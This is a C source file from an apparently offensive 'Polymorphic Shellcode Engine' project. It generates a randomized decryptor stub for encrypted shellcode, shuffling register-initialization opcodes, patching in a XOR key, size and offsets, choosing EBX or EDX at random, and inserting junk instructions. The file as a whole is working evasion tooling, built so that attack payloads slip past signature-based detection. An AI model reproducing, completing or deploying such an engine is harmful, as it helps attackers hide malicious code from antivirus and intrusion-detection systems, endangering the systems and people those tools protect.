/*
** build_init.c for Polymorphic Shellcode Engine project
** 
** Made by eee
** 
** Started on  Tue Apr 12 15:56:24 2005 eee
** Last update Fri Apr 15 00:22:19 2005 eee
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pse.h>

extern t_tab	gl_init[];
extern t_tab	gl_junk1[];
extern t_tab	gl_junk2[];

void	init_junk(t_env *env, int *junk)
{
  int	rnd;

  rnd = (random() % TAB_JUNK2);
  memcpy(env->decrypt, &gl_junk2[rnd].op, 2);
  printf("%s\n", gl_junk2[rnd].desc);
  *junk = 1;
  env->decrypt += 2;
}

int	get_valid_rnd(t_env *env, int init)
{
  env->rnd = random() % TAB_INIT;
  for (; (init & (1 << env->rnd)) != 0 ||
	 env->rnd == TAB_INIT; env->rnd++)
    {
      if (env->rnd == TAB_INIT)
	env->rnd = -1;
    }
  return (init);
}

void	patch_init_key(t_env *env)
{
  if (env->reg == EBX)
    {
      gl_init[env->rnd].op += (XOR_EBX << 8);
      gl_init[env->rnd].op += (MOV_BL << 16);
    }
  else
    {
      gl_init[env->rnd].op += (XOR_EDX << 8);
      gl_init[env->rnd].op += (MOV_DL << 16);
    }
  gl_init[env->rnd].op += (env->key << 24);
  printf("%s\n", gl_init[env->rnd].desc);
}

void		patch_esi_edi(t_env *env)
{
  int		tmp;

  if (env->ebp == 0)
    {
      env->ebp++;
      printf("%s\n", gl_init[TAB_INIT].desc);
      gl_init[TAB_INIT].op += (OFFSET << 16);
      tmp = random() % TAB_JUNK1;
      gl_init[TAB_INIT].op += (OFFSET << 24);
      printf("%s\n", gl_junk1[tmp].desc);
      memcpy(env->decrypt, &gl_init[TAB_INIT].op, sizeof(int));
      env->decrypt += sizeof(int);
    }
  printf("%s\n", gl_init[env->rnd].desc);
  tmp = random() % TAB_JUNK2;
  gl_init[env->rnd].op += (gl_junk2[tmp].op << 16);
  printf("%s\n", gl_junk2[tmp].desc);
}

void	patch_tab(t_env *env)
{

  if (env->rnd == INIT_ESI || env->rnd == INIT_EDI)
    patch_esi_edi(env);
  else if (env->rnd == INIT_KEY)
    patch_init_key(env);
  else if (env->rnd == INIT_SIZE)
    {
      gl_init[env->rnd].op += (env->size << 24);
      printf("%s\n", gl_init[env->rnd].desc);
    }
}

void		build_init(t_env *env)
{
  int		i;
  int		init;
  int		junk;

  env->reg = random() % 2;
  env->ebp = 0;
  for (init = 0, junk = 0, i = 0; i < TAB_INIT; i++)
    {
      init = get_valid_rnd(env, init);
      patch_tab(env);
      memcpy(env->decrypt, &gl_init[env->rnd].op, sizeof(int));
      init += (1 << env->rnd);
      env->decrypt += sizeof(int);
      if (((junk == 0) && (random() % 2)) ||
	  (junk == 0 && i == TAB_INIT - 1))
	init_junk(env, &junk);
    }
  if (env->reg == 0)
    printf("size = %d, reg = EBX, key = %d\n", env->size, env->key);
  else
    printf("size = %d, reg = EDX, key = %d\n", env->size, env->key);
}

